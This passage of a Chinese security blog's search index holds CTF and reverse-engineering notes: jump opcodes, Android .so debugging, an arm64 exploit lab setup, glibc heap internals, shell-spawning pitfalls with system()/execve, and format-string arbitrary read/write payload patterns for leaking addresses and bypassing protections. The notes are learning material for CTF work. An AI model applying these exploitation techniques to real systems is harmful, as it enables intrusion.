    <content type="text"><![CDATA[相对地址跳转 伪代码 机器码 示例 jmp short s eb+offset（1个字节） eb03 ，ebfd jmp near ptr s e9+offset（4个字节） e996000000, e964ffffff 绝对地址跳转 位数 伪代码 机器码 示例 32 push addr; jmp esp; 68+addr(4个字节 )+ffe4 68afbeaddeffe4 64 mov rax, addr; jmp rax; 48b8+addr(8个字节)+ffe0 48b8afbeaddeafbeafdeffe0]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac下进行android so动态调试]]></title>
    <url>%2F2017%2F05%2F07%2Fmac-android-so-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[环境： MacOS（宿主机） android-studio(包含adb、monitor、jdb等工具) ida pro(包含android_server) Android模拟器或手机(android） 待调试app 注意： 如果是模拟器进行调试，ro.debuggable默认为1，不需要二次打包 如果是真机进行调试，有2种比较方便的方法 对app进行二次打包，修改AndroidManifest.xml中application，添加android:debuggable=&quot;true&quot; 安装xposed框架（需要root，刷第三方recovery），之后安装xinstaller模块，设置xinstaller启动专家模式，在其他设置中开启“调试应用” 运行：1. 运行android_server（默认开启23946端口）12345adb push android_server /data/local/tmp/adb shellsuchmod 777 /data/local/tmp/android_server/data/local/tmp/android_server 2. 以debug模式启动程序12adb shell dumpsys activity top | head # 查看top activity信息，作为下面-n的参数adb shell am start -D -n com.yaotong.crackme/.MainActivity 3. 开启ddmsmonitor，选中要调试的app（开启8700端口） 4. ida attach target app and suspend on libary loading，F9继续运行5. 用jdb将app恢复执行1jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700 6. add breakpoint at JNI_OnLoad参考： http://wooyun.jozxing.cc/static/drops/tips-6840.html http://wooyun.jozxing.cc/static/drops/mobile-5942.html]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建arm64 exploit环境]]></title>
    <url>%2F2017%2F05%2F06%2Fbuild-arm-exploit-env%2F</url>
    <content type="text"><![CDATA[环境安卓手机(android5.0及以上, arm64, root) 笔记本 工具adb、termux、f-droid（可选，可通过f-droid安装termux） 步骤1. 安装termux （手机）2. 安装sshd运行termux1234apt updateapt install -y opensshwhoami # u0_a279sshd 3. 建立ssh连接（电脑）123456789adb push ~/.ssh/id_rsa.pub /data/local/tmp/adb shell&gt;su#cat /data/local/tmp/id_rsa.pub &gt;&gt; \ /data/data/com.termux/files/home/.ssh/authorized_keys#chown u0_a279:u0_a279 /data/data/com.termux/files/home/.ssh/authorized_keysexitexitssh $ip -p8022 4. 安装软件12345678910111213apt install -y python2 python2-dev socat \ strace clang make gdb git wget\ libffi-dev openssl-dev file \ tsu tmuxpip2 download capstonetar zxf capstone-3.0.4.tar.gzcd capstone-3.0.4termux-fix-shebang src/make.shpython2 setup.py installcd .. &amp;&amp; rm -rf capstone-3.04. &amp;&amp; rm capstone-3.0.4.tar.gzpip2 install pwntoolstermux-setup-storage # 获取sdcard访问权限tsu # 切换到root账户 参考https://termux.com/linux.html https://termux.com/ssh.html]]></content>
      <categories>
        <category>exploit</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>arm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[About heap]]></title>
    <url>%2F2017%2F04%2F20%2Fabout-heap%2F</url>
    <content type="text"><![CDATA[本文主要介绍ptmalloc3中关键的数据结构以及 malloc、free函数的执行过程。 malloc_state123456789101112131415161718192021222324252627282930313233343536373839struct malloc_state &#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; #if THREAD_STATS /* Statistics for locking. Only used if THREAD_STATS is defined. */ long stat_lock_direct, stat_lock_loop, stat_lock_wait; #endif /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; #ifdef PER_THREAD /* Linked list for free arenas. */ struct malloc_state *next_free; #endif /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; heap_info123456789101112typedef struct _heap_info&#123; mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; fastbin 缓存small bin前7个 单链表，LIFO 栈 32bit: 范围 0x10-0x40 8字节依次递增 共7个 64bit: 范围 0x20-0x80 16字节依次递增 共7个 精确匹配 libc中的全局变量global_max_fast定义了fast bins中chunk的最大值，get_max_fast()函数用于获取该值 bins 共128，第0个和第127个不用，第1个为unsorted bin，接下来62个为small bin，后面63个为large bin 每个bin使用双向循环链表管理空闲chunk，bin的链表头的指针fb指向第一个可用的chunk，指针bk指向最后一个可用的chunk，分别对应宏first(b)和last(b) small bins 共62个 双向链表，FIFO 精确匹配 32bit 范围 16-504B (&lt;0x200B) 64bit 范围 32-1008B(&lt; 0x400B) large bins共63个 分成6组，每组数量依次为32、16、8、4、2、1 32bit 从0x200B开始，公差依次为0x40B、0x200B、0x1000B、3276B、262144B 64bit 从0x400B开始，公差依次为0x40B、0x200B、0x1000B、0x8000B 范围匹配 每个bin中的chunk按照从大到小排列，同时一个chunk存在于两个双向链表中，一个链表包含了large bin中所有的chunk，另一个链表为chunk size链表，该链表从每个相同大小的chunk取出第一个chunk按照大小顺序链接在一起，便于一次跨域多个相同大小的chunk遍历下一个不同大小的chunk unsorted bin，只有一个，位于bins表的第一个位置 top chunk 只有一个，位于malloc_state结构中 last_remainder 一个，分配区上次分配small chunk时，从一个chunk中分裂出一个small chunk返回给用户，分裂后的剩余部分形成一个chunk，last_remainder就指向这个chunk 每个bin使用双向循环链表管理空闲chunk，bin的链表头的指针fb指向第一个可用的chunk，指针bk指向最后一个可用的chunk，分别对应宏first(b)和last(b) main_arena和 thread arena malloc 首先检测请求大小是否小于 global_max_fast时，如果满足且对应的fastbin非空，采用LIFO，移除对应的fastbin指向的free chunk （存在大小检查），返回；不满足，继续下一步 检查请求大小是否满足in_smallbin_range（小于MIN_LARGE_SIZE），如果对应的small bin非空，移除bk指向的free chunk，即双向链表中的最后一个free chunk，设置下一个chunk的inuse标志位，返回；不满足，继续下一步 反向遍历unsorted bin表中的free chunk 如果需要分配small bin chunk，且unsorted bin中只有一个chunk，并且这个chunk为last_remainder_chunk且这个chunk的大小大于所需的chunk大小加上MINSIZE，如下所示： 12345if (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long)(size) &gt; (unsigned long)(nb + MINSIZE)) &#123; 不满足以上条件，从unsorted bin中移除当前chunk，如果该chunk等于所需的chunk的大小，则返回 将当前chunk加到对应的small bin或者large bin表中 如果分配的chunk为large bin chunk，遍历large bin表，找到合适的chunk 如果通过上面的方式从最合适的 small bin 或 large bin 中都没有分配到需要的 chunk，则 查看比当前bin的index大的small bin或large bin是否有空闲chunk可利用来分配所需的 chunk 尝试从top chunk中分配所需chunk free 首先检查大小是否小于 get_max_fast()，如果小于且检查下一个相邻堆块通过，则将当前堆块插到对应的fast bin表表头，返回；否则进入下一步 检查当前块的前一个堆块是否空闲，如果空闲，则将它从bin表中删除（unlink），计算合并后的大小 检查与当前块相邻的下一个chunk是不是top chunk，如果不是，检测是否处于inuse状态，若空闲，unlink 将合并后的chunk加入unsorted bin 双向链表中 参考： https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/]]></content>
      <categories>
        <category>exploit</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn中system调用失败分析]]></title>
    <url>%2F2017%2F04%2F20%2Fpwn%E4%B8%ADsystem%E8%B0%83%E7%94%A8%E5%A4%B1%E8%B4%A5%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[在ctf比赛中，有时调试一个pwn题目，发现直到调用system函数、传参时都是对的，但是system函数会执行失败，就是无法拿到shell，在这里总结了一下可能的原因： 在调用system函数时，esp指针指向的区域前面不存在一定空间的可写数据区，原因是在函数执行过程中，会维护自己的栈帧(sub esp, xxxx) —— fake frame时需要注意，会触发__libc_sigaction错误，fault address system函数的调用流程：system -&gt; do_system-&gt;execve，execve函数执行时，会有三个参数: 1__execve (SHELL_PATH, (char *const *) new_argv, __environ); 其中， 12345678SHELL_PATH = &quot;/bin/bash&quot;;const char *new_argv[4];new_argv[0] = SHELL_NAME; // &quot;sh&quot;new_argv[1] = &quot;-c&quot;;new_argv[2] = line;new_argv[3] = NULL;environ=&quot;HOME=skysider&quot; // or &quot;&quot; 当environ指向的栈数据被无效数据覆盖时，就会调用失败。因此可以采用gdb动态调试的方法，若发现system函数能够执行到execve函数，可以观察此时execve的几个参数值是否正常，若异常，就可以去寻找对应的原因。 一种解决的方法是不调用system函数，而是调用execve函数，在调用时指定environ为NULL即可，即 execve(&quot;/bin/sh&quot;, 0, 0) 调试技巧：1234b systemb execvestack // 查看堆栈数据,SHELL_PATH和environx/s *(char**)(*(char **)($esp+8)+8) // 查看 line]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个用于CTF PWN的docker容器]]></title>
    <url>%2F2017%2F02%2F21%2FPwnDocker%2F</url>
    <content type="text"><![CDATA[1. 介绍一个基于phusion/baseimage的docker容器，用于ctf中的Pwn类题目 2. 使用12345678docker run -it \ --rm \ -h $&#123;ctf_name&#125; \ --name $&#123;ctf_name&#125; \ -v $(pwd)/$&#123;ctf_name&#125;:/ctf/work \ -p 23946:23946 \ --cap-add=SYS_PTRACE \ skysider/pwndocker 3. 包含的软件 pwntools —— CTF framework and exploit development library pwndbg —— a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers ROPgadget —— facilitate ROP exploitation tool roputils —— A Return-oriented Programming toolkit one_gadget —— A searching one-gadget of execve(‘/bin/sh’, NULL, NULL) tool for amd64 and i386 angr —— A platform-agnostic binary analysis framework radare2 —— A rewrite from scratch of radare in order to provide a set of libraries and tools to work with binary files LibcSearcher —— A libc search tool based on leaked function address linux_server[64] —— IDA 7.0 debug server for linux tmux —— a terminal multiplexer ltrace —— trace library function call strace —— trace system call]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化串漏洞利用姿势]]></title>
    <url>%2F2016%2F11%2F09%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[确定偏移 利用pwntools提供的FmtStr(exec_fmt)，获取offset 读/写栈上数据 读：计算出要读的地址是第xxx个不定参数，然后利用%xxx$x 读取（x-十六进制读，lx长整读取（64位）） 写：首先泄露栈上rbp的值，然后根据rbp与返回地址之间的差值，得出返回地址所在的栈地址，利用任意地址写即可覆盖返回地址，如下图所示，可泄露show函数栈帧中rbp1的值，然后利用rbp1与printf函数返回地址之间的差值，计算可到printf返回地址所在的地址，覆盖之（绕过FULL RELRO，泄露show函数的返回地址，可以绕过PIE，泄露main函数的返回地址，即__libc_start_main_ret，可以leak libc） 读/写任意地址数据 读： 发送：payload = START + %xx$s + END+ addr 接收： recvuntil(START)data = recvuntil(END, drop=1, timeout=1)if not data:data = &apos;\\x00&apos; 读取addr地址处的字符串，xxx是根据addr在栈上的地址计算出的不定参数的值recvuntil(START) 写： payload = %yyyc+%xxx$hn+[padding]+addr xxx计算方法同上，yyy为要写入的数据，可以用fmtstr_payload(offset, writes)实现 DynELF时leak函数至少返回1字节，并且addr地址中可以出现\x00，]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
